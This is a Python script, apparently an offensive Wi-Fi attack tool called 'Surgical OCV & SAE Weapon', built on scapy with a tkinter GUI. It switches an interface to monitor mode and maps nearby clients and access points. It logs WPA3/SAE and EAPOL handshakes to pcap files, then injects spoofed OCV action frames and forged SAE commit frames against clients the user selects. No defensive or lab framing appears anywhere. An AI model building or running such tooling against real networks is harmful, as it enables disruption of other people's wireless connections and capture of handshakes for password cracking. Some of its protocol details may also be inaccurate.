import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class WPA3_Surgical_v5_7:
    def __init__(self, iface):
        self.iface = iface
        self.targets = {} 
        self.active_attacks = set()
        self.captured_handshakes = set()
        
        self.setup_monitor_mode()
        
        self.root = tk.Tk()
        self.root.title("Surgical OCV & SAE Weapon v5.7")
        self.root.geometry("800x600")
        self.root.configure(bg="#050505")

        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", font=("Courier", 10), height=20)
        self.listbox.pack(padx=10, pady=10, fill="both", expand=True)

        btn_frame = tk.Frame(self.root, bg="#050505")
        btn_frame.pack(pady=10)
        
        tk.Button(btn_frame, text="OCV VIOLATION", command=self.trigger_ocv_attack, bg="#aa5500", fg="white", width=15).pack(side="left", padx=5)
        tk.Button(btn_frame, text="SAE COMMIT RESET", command=self.trigger_sae_attack, bg="#880000", fg="white", width=15).pack(side="left", padx=5)
        tk.Button(btn_frame, text="STOP ALL", command=self.stop_all, bg="#444", fg="white", width=15).pack(side="left", padx=5)

        threading.Thread(target=self.scanner, daemon=True).start()
        threading.Thread(target=self.attack_engine, daemon=True).start()

    def setup_monitor_mode(self):
        os.system(f"sudo airmon-ng check kill")
        os.system(f"sudo ip link set {self.iface} down")
        os.system(f"sudo iw dev {self.iface} set type monitor")
        os.system(f"sudo ip link set {self.iface} up")

    def scanner(self):
        def handler(pkt):
            if not pkt.haslayer(Dot11): return

            # 1. Map Active Clients (Logic: Source/Destination in Data Frames)
            if pkt.type == 2:
                c, b = pkt.addr2, pkt.addr3
                if b and c and c != b and c != "ff:ff:ff:ff:ff:ff":
                    if c not in self.targets:
                        self.targets[c] = {"BSSID": b, "Type": "WPA3?"}
                        self.root.after(0, self.refresh_ui)

            # 2. Capture Re-authentication Handshakes (The "Prize")
            if pkt.haslayer(EAPOL) or (pkt.haslayer(Dot11Auth) and pkt.algo == 3):
                bssid = pkt.addr3
                if bssid not in self.captured_handshakes:
                    filename = f"HANDSHAKE_{bssid.replace(':','')}.pcap"
                    wrpcap(filename, pkt, append=True)
                    self.captured_handshakes.add(bssid)
                    print(f"[!] HANDSHAKE CAPTURED: {filename}")

        sniff(iface=self.iface, prn=handler, store=0)

    def attack_engine(self):
        while True:
            for client_mac in list(self.active_attacks):
                data = self.targets[client_mac]
                b = data["BSSID"]
                
                # Logic: OCV Violation Injection
                # We send an Action Frame (Category 10: Radio Measurement) 
                # with a mismatching Operating Class element
                dot11 = Dot11(addr1=b, addr2=client_mac, addr3=b)
                # Element ID 255, Ext ID 10 is the OCV indicator
                ocv_error = Dot11Action(category=10, action=4)/Raw(load=b"\xff\x0a\x01\x01") 
                
                pkt = RadioTap()/dot11/ocv_error
                sendp(pkt, iface=self.iface, verbose=False, count=5)
            time.sleep(0.5)

    def trigger_ocv_attack(self):
        for i in self.listbox.curselection():
            mac = list(self.targets.keys())[i]
            self.active_attacks.add(mac)
        self.refresh_ui()

    def trigger_sae_attack(self):
        # Implementation of the previous SAE Commit logic
        for i in self.listbox.curselection():
            mac = list(self.targets.keys())[i]
            b = self.targets[mac]["BSSID"]
            pkt = RadioTap()/Dot11(type=0, subtype=11, addr1=b, addr2=mac, addr3=b)/Dot11Auth(algo=3, seqnum=1, status=0)
            sendp(pkt, iface=self.iface, count=10, verbose=False)
        self.refresh_ui()

    def stop_all(self):
        self.active_attacks.clear()
        self.refresh_ui()

    def refresh_ui(self):
        self.listbox.delete(0, tk.END)
        for mac, info in self.targets.items():
            status = " [ATTACKING] " if mac in self.active_attacks else " [STABLE] "
            captured = " *CAP*" if info["BSSID"] in self.captured_handshakes else ""
            self.listbox.insert(tk.END, f"{status}{mac} | AP: {info['BSSID']}{captured}")

if __name__ == "__main__":
    if len(sys.argv) < 2: print("Usage: sudo python3 weapon.py [interface]")
    else: WPA3_Surgical_v5_7(sys.argv[1]).root.mainloop()
